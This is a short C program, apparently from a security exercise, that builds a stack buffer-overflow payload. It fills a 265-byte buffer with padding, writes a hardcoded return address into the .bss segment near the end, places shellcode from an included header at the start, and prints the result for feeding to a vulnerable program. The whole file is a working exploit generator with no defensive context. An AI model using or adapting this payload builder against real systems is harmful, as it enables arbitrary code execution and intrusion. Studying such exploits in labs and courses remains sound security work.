#include <stdio.h>
#include <string.h>

#include "shellcode.h"

int main(int argc, char *argv[]) {
    char buff[265], *ptr, *sc;
    long *addr_ptr, addr;
    int i;

    sc = alt_shellcode; // Shellcode to execute
    addr = 0x0804c040;  // Address to jump to (in .bss)

    for (i = 0; i < 265; i++) {
        // Fill buffer with junk
        buff[i] = 'A';
    }

    ptr = buff + 264 - 8;
    addr_ptr = (long *)ptr;

    for (i = 0; i < 8; i += 4) {
        // write the address to jump to to the end of the buffer
        *(addr_ptr++) = addr;
    }

    for (i = 0; i < strlen(sc); i++) {
        // Write the shellcode to the start of the buffer
        buff[i] = sc[i];
    }
    buff[264] = '\0';

    printf("%s", buff);

    return 0;
}
